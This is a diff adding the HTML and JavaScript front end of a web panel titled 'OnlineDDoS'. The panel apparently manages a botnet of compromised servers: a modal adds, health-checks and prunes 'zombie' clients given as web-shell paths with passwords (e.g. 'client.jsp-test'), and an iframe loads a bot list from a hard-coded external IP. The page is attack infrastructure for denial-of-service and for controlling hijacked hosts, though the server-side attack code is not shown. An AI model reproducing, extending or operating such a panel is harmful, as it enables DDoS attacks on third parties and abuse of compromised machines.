@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8"/>
+    <meta name="robots" content="noindex, nofollow"/>
+    <meta name="googlebot" content="noindex, nofollow"/>
+    <title>OnlineDDoS</title>
+    <script type="text/javascript" src="http://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.1/jquery.js" ></script>
+	<link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/4.1.0/css/bootstrap.min.css">
+	<script src="https://cdn.bootcss.com/popper.js/1.12.5/umd/popper.min.js"></script>
+	<script src="https://cdn.bootcss.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="js/fullpage.js"></script>
+    <link rel="stylesheet" type="text/css" href="main.css"/>
+</head>
+<body>
+<div id="wrap">
+	<div id="btn"><div class="bar"></div></div>
+	<div id="nav">
+		<div class="bg"></div>
+		<div class="portrait">
+			<a href="#"><img src="images/touxiang.JPG" alt=""></a>
+			<span id="showUserName">用户名</span>
+		</div>
+		<ul class="menu">
+			<li><a href="#" id="menu_zhuye">主页</a></li>
+			<li><a href="#" id="menu_rouji">服务端管理</a></li>
+		</ul>
+	</div>
+	<div id="content">
+		<div class="section" id="page">
+			<iframe src="page/main/main.html" width="100%" frameborder="0" scrolling="auto" id="ZhuYe"></iframe>
+		</div>
+	</div>
+	
+	<div class="modal fade" id="KeHuDuan">
+    <div class="modal-dialog modal-lg">
+      <div class="modal-content">
+        <div class="modal-header">
+          <h4 class="modal-title">客户端管理</h4>
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+        </div>
+        <div class="modal-body">
+            <div class="row">
+                <div class="col-sm-5">
+                    <iframe src="http://123.207.241.119:8080/page/main/rouji_list.jsp" height="430" width="100%" frameborder="0"> </iframe>
+                </div>
+                <div class="col-sm-7">
+                    <textarea class="form-control" rows="10" id="InputClient"></textarea>
+                    <br>
+                    <button type="button" class="btn btn-success btn-block" onclick="AddClient()">确认添加(格式:域名/IP-密码;形如:127.0.0.1/client.jsp-test)</button>
+                    <br>
+                    <button type="button" class="btn btn-info btn-block" onclick="CheckClient()">重新检测客户端状态</button>
+                    <br>
+                    <button type="button" class="btn btn-danger btn-block" onclick="Del404()">删除所有404客户端</button>
+                </div>
+            </div>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-secondary" data-dismiss="modal">关闭</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<script>
+	$('#btn').click(function() {
+	$('body').toggleClass('NavOn');
+	$(this).toggleClass('animate');
+	});
+	$('#content').fullpage();
+	$('#menu_zhuye').on('click',function(){
+		$('#page iframe').attr('src','page/main/main.html');
+	});
+	$('#menu_rouji').on('click',function(){
+		$('#KeHuDuan').modal('show');
+	});
+</script>
+<script>
+	function changeFrameHeight(){
+        var ifm= document.getElementById("ZhuYe");
+		ifm.height=document.documentElement.clientHeight;
+    }
+    window.onresize=function(){ changeFrameHeight();}
+	$(function(){changeFrameHeight();});
+</script>
+<script>
+	window.onload = function()
+	{
+		CheckIDCode();
+		GetUserName();
+
+	};
+	function trimStr(str) { 
+        return str.replace(/(^\s*)|(\s*$)/g, ""); 
+    }
+	function CheckIDCode()
+	{
+	    var id = getCookie("id");
+		var code = getCookie("code");
+		var xmlhttp = new XMLHttpRequest();
+		xmlhttp.onreadystatechange = function () {
+			if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
+				var mes = trimStr(xmlhttp.responseText);
+				if(mes != "T")
+				{
+					alert("请先登录!");
+					window.location.href="login/index.html";
+				}
+			}
+		}
+		var data = "id="+id+"&code="+code;
+		xmlhttp.open("POST", "lib/checkid.jsp", true);
+		xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+		xmlhttp.send(data);
+	}
+	function getCookie(c_name)
+	{
+		if (document.cookie.length>0)
+		  {
+		  c_start=document.cookie.indexOf(c_name + "=")
+		  if (c_start!=-1)
+			{ 
+			c_start=c_start + c_name.length+1 
+			c_end=document.cookie.indexOf(";",c_start)
+			if (c_end==-1) c_end=document.cookie.length
+			return unescape(document.cookie.substring(c_start,c_end))
+			} 
+		  }
+	return ""
+	}
+	function GetUserName()
+	{
+		var email = getCookie("email");
+		var xmlhttp = new XMLHttpRequest();
+		xmlhttp.onreadystatechange = function () {
+			if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
+				var mes = trimStr(xmlhttp.responseText);
+				document.getElementById('showUserName').innerHTML = mes.split('-')[1];
+			}
+		}
+		var data = "email="+email;
+		xmlhttp.open("POST", "lib/getinfo.jsp", true);
+		xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+		xmlhttp.send(data);
+	}
+	function AddClient()
+	{
+		var text = document.getElementById('InputClient').value;
+		var xmlhttp = new XMLHttpRequest();
+		xmlhttp.onreadystatechange = function () {
+			if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
+				var mes = trimStr(xmlhttp.responseText);
+				alert(mes);
+			}
+		}
+		var data = "sign=add&text="+text;
+		xmlhttp.open("POST", "lib/clientEdit.jsp", true);
+		xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+		xmlhttp.send(data);
+	}
+	function CheckClient()
+	{
+		var xmlhttp = new XMLHttpRequest();
+		xmlhttp.onreadystatechange = function () {
+			if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
+				var mes = trimStr(xmlhttp.responseText);
+				alert(mes);
+			}
+		}
+		var data = "sign=check";
+		xmlhttp.open("POST", "lib/clientEdit.jsp", true);
+		xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+		xmlhttp.send(data);
+	}
+	function Del404()
+	{
+		var text = document.getElementById('InputClient').value;
+		var xmlhttp = new XMLHttpRequest();
+		xmlhttp.onreadystatechange = function () {
+			if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
+				var mes = trimStr(xmlhttp.responseText);
+				alert(mes);
+			}
+		}
+		var data = "sign=remove";
+		xmlhttp.open("POST", "lib/clientEdit.jsp", true);
+		xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+		xmlhttp.send(data);
+	}
+</script>
+</body>
+</html>
